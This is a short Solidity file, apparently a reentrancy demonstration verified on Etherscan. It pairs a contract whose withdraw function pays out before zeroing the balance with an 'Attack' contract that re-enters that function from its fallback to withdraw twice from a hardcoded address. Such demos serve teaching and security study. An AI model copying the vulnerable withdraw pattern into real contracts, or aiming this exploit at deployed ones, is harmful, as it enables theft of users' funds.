/**
 *Submitted for verification at Etherscan.io on 2021-12-03
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    mapping(address => uint256) public balances;

    uint counter = 0;
    address vulnerable_address = 0x36A540E3A78084962B75E25877CfACf8846Be018;
    Vuln vulnerable_contract = Vuln(vulnerable_address);

    function depositAndWithdraw() public payable {
        vulnerable_contract.deposit.value(0.01 ether)();
        vulnerable_contract.withdraw();
    }

    // Fallback Function
    function () external payable {
        counter = counter + 1;
        if (counter < 2) {
            vulnerable_contract.withdraw();
        }
    }
}